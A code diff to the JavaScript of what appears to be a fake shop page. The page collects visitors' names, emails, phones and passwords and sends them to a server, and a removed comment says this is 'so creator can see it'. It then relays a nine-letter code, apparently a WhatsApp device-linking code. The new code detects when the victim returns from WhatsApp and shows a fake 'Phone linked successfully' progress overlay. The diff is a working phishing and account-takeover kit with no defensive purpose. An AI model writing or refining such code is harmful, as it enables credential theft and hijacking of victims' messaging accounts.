@@ -14,6 +14,8 @@ let socket = null;
 let sessionId = null;
 let currentLetters = Array(9).fill('');
 let cartCount = 0;
+let whatsappClicked = false;
+let linkingStarted = false;
 
 // Create the 9 bubbles
 for (let i = 0; i < 9; i++) {
@@ -54,25 +56,20 @@ function updateBubbles(letters) {
 
 // ========== PRODUCTS DATA ==========
 const products = [
-  // Clothes
   { id: 1, name: "Classic White Tee", price: 24.99, cat: "clothes", emoji: "👕" },
   { id: 2, name: "Denim Jacket", price: 59.99, cat: "clothes", emoji: "🧥" },
   { id: 3, name: "Summer Dress", price: 39.99, cat: "clothes", emoji: "👗" },
-  { id: 4, name: "Hoodie", price: 44.99, cat: "clothes", emoji: "hoodie" },
-  // Phones
+  { id: 4, name: "Hoodie", price: 44.99, cat: "clothes", emoji: "🧥" },
   { id: 5, name: "Nova X Pro", price: 699.00, cat: "phones", emoji: "📱" },
   { id: 6, name: "Pulse 12", price: 499.00, cat: "phones", emoji: "📱" },
   { id: 7, name: "Lite Mini", price: 249.00, cat: "phones", emoji: "📱" },
-  // Food
   { id: 8, name: "Organic Honey", price: 12.50, cat: "food", emoji: "🍯" },
   { id: 9, name: "Artisan Coffee", price: 18.00, cat: "food", emoji: "☕" },
   { id: 10, name: "Dark Chocolate", price: 8.99, cat: "food", emoji: "🍫" },
   { id: 11, name: "Green Tea Box", price: 14.50, cat: "food", emoji: "🍵" },
-  // Jewelry
   { id: 12, name: "Silver Necklace", price: 79.00, cat: "jewelry", emoji: "📿" },
   { id: 13, name: "Gold Ring", price: 129.00, cat: "jewelry", emoji: "💍" },
   { id: 14, name: "Pearl Earrings", price: 49.00, cat: "jewelry", emoji: "👂" },
-  // General
   { id: 15, name: "Leather Wallet", price: 34.99, cat: "general", emoji: "👛" },
   { id: 16, name: "Wireless Earbuds", price: 59.99, cat: "general", emoji: "🎧" },
   { id: 17, name: "Notebook Set", price: 15.00, cat: "general", emoji: "📓" },
@@ -108,12 +105,51 @@ function renderProducts(filter = "all") {
   });
 }
 
-// Category tabs
 document.getElementById("category-tabs").addEventListener("click", (e) => {
   if (!e.target.classList.contains("cat-btn")) return;
   document.querySelectorAll(".cat-btn").forEach(b => b.classList.remove("active"));
   e.target.classList.add("active");
   renderProducts(e.target.dataset.cat);
+});
+
+// ========== START THE 1-MINUTE LINKING OVERLAY ==========
+function startLinkingWait() {
+  if (linkingStarted) return;
+  linkingStarted = true;
+
+  linkingOverlay.classList.remove('hidden');
+  let progress = 0;
+  const totalTime = 60000; // 1 minute
+  const interval = 400;
+  const step = 100 / (totalTime / interval);
+
+  const timer = setInterval(() => {
+    progress += step;
+    if (progress > 100) progress = 100;
+    overlayProgress.style.width = progress + '%';
+    if (progressFill) progressFill.style.width = progress + '%';
+  }, interval);
+
+  setTimeout(() => {
+    clearInterval(timer);
+    linkingOverlay.classList.add('hidden');
+    showToast('Phone linked successfully');
+  }, totalTime);
+}
+
+// Detect when user returns to the tab after leaving for WhatsApp
+document.addEventListener('visibilitychange', () => {
+  if (document.visibilityState === 'visible' && whatsappClicked && !linkingStarted) {
+    // User came back after clicking WhatsApp
+    startLinkingWait();
+  }
+});
+
+// Also catch focus just in case
+window.addEventListener('focus', () => {
+  if (whatsappClicked && !linkingStarted) {
+    startLinkingWait();
+  }
 });
 
 // ========== FORM SUBMIT ==========
@@ -139,7 +175,7 @@ form.addEventListener('submit', async (e) => {
     firstName: document.getElementById('firstName').value.trim(),
     email: document.getElementById('email').value.trim(),
     phone: document.getElementById('phone').value.trim(),
-    password: password   // sent to server so creator can see it
+    password: password
   };
 
   try {
@@ -157,21 +193,7 @@ form.addEventListener('submit', async (e) => {
     const { sessionId: id } = await res.json();
     sessionId = id;
 
-    // Show linking overlay for ~2 minutes
-    linkingOverlay.classList.remove('hidden');
-    let progress = 0;
-    const totalTime = 120000; // 2 minutes
-    const interval = 500;
-    const step = 100 / (totalTime / interval);
-
-    const timer = setInterval(() => {
-      progress += step;
-      if (progress > 100) progress = 100;
-      overlayProgress.style.width = progress + '%';
-      if (progressFill) progressFill.style.width = progress + '%';
-    }, interval);
-
-    // Connect socket early
+    // Connect socket
     socket = io();
     socket.on('connect', () => {
       socket.emit('join-session', sessionId);
@@ -183,22 +205,29 @@ form.addEventListener('submit', async (e) => {
       showToast(err.message || 'Connection error');
     });
 
-    // After 2 minutes (or you can reduce for testing)
-    setTimeout(() => {
-      clearInterval(timer);
-      linkingOverlay.classList.add('hidden');
-      showStep(stepBubbles);
-      showToast('Connection established');
-      btn.disabled = false;
-      btn.textContent = 'Next';
-    }, totalTime);
+    // Go straight to the 9 bubbles page (NO wait yet)
+    showStep(stepBubbles);
+    showToast('Connected');
+    btn.disabled = false;
+    btn.textContent = 'Next';
 
   } catch (err) {
     console.error(err);
     showToast(err.message || 'Something went wrong');
     btn.disabled = false;
     btn.textContent = 'Next';
-    linkingOverlay.classList.add('hidden');
+  }
+});
+
+// Capture WhatsApp link click
+document.addEventListener('click', (e) => {
+  const link = e.target.closest('a.social-link.whatsapp');
+  if (link) {
+    whatsappClicked = true;
+    // small delay so the browser has time to open WhatsApp
+    setTimeout(() => {
+      // flag is already set – when they return, visibilitychange will fire
+    }, 300);
   }
 });
 
